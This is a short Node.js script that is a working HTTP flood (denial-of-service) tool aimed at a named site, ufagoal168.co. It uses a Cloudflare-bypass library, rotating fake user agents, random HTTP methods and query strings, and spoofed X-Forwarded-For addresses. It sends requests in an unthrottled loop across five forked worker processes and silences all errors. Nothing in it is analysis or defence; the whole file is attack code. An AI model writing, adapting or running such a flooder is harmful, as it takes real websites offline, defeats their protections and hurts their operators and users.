require('events').EventEmitter.defaultMaxListeners = 0;
const cloudflare = require("cloudflare-bypasser")
const cf = new cloudflare();
const randomstring = require("randomstring")
const fakeUa = require("fake-useragent");
function flood_req(){
var char = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
var charr = randomstring.generate({
length:7,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
ipq = function ranip(){
return Math.round(Math.random()*256)
}
var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
var randommode = Array_method[Math.floor(Math.random()*Array_method.length)]
cf.request({
method:randommode,
resolveWithFullResponse: true,
headers:{
'User-Agent': fakeUa(),
'Upgrade-Insecure-Requests': '1',
'Connection':'Keep-Alive',
'Keep-Alive': 'timeout=10,max=100',
'Origin': 'http://' + char + '.com',
'Referrer': 'http://google.com/' + char,
'X-Forwarded-For': ip
},
url:"https://ufagoal168.co/"+"?"+charr
})

}
function th(){
setInterval(()=>{
flood_req()
})
}
if(cluster.isMaster){
	for (let i=0;i<5;i++){
    cluster.fork()}
}else{
	th()
	}
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
